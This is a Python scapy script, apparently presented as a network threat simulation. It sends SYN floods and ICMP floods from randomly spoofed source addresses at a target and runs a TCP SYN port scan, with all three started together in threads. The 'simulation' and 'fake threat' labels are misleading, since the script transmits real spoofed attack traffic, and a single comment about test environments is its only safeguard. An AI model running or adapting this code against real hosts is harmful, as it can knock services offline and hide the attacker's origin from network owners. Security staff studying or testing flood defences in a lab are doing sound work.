from scapy.all import *
import random
import threading

def random_ip():
    """Generate a random IP address."""
    return ".".join(str(random.randint(0, 255)) for _ in range(4))

def syn_flood(target_ip, target_port, num_packets):
    """Simulate a SYN flood attack."""
    for _ in range(num_packets):
        ip_layer = IP(src=random_ip(), dst=target_ip)
        tcp_layer = TCP(sport=random.randint(1024, 65535), dport=target_port, flags="S")
        packet = ip_layer/tcp_layer
        send(packet, verbose=0)

def icmp_flood(target_ip, num_packets):
    """Simulate an ICMP (Ping) flood."""
    for _ in range(num_packets):
        ip_layer = IP(src=random_ip(), dst=target_ip)
        icmp_layer = ICMP()
        packet = ip_layer/icmp_layer
        send(packet, verbose=0)

def port_scan(target_ip, start_port, end_port):
    """Simulate a simple TCP port scan."""
    for target_port in range(start_port, end_port + 1):
        ip_layer = IP(dst=target_ip)
        tcp_layer = TCP(dport=target_port, flags="S")
        packet = ip_layer/tcp_layer
        response = sr1(packet, timeout=1, verbose=0)
        if response:
            if response.haslayer(TCP) and response.getlayer(TCP).flags == 0x12:  # SYN-ACK
                print(f"Port {target_port} is open.")

def run_simulation(target_ip):
    """Run all simulations concurrently."""
    # Thread for SYN Flood
    syn_thread = threading.Thread(target=syn_flood, args=(target_ip, 80, 100))
    # Thread for ICMP Flood
    icmp_thread = threading.Thread(target=icmp_flood, args=(target_ip, 100))
    # Thread for Port Scan
    port_scan_thread = threading.Thread(target=port_scan, args=(target_ip, 80, 85))

    # Start all threads
    syn_thread.start()
    icmp_thread.start()
    port_scan_thread.start()

    # Wait for all threads to complete
    syn_thread.join()
    icmp_thread.join()
    port_scan_thread.join()

    print("Fake threat simulation completed.")

# Example usage (Replace 'target_ip' with your target IP address in a controlled environment)
target_ip = "192.168.1.100"  # Change this to your target IP in a test environment
run_simulation(target_ip)
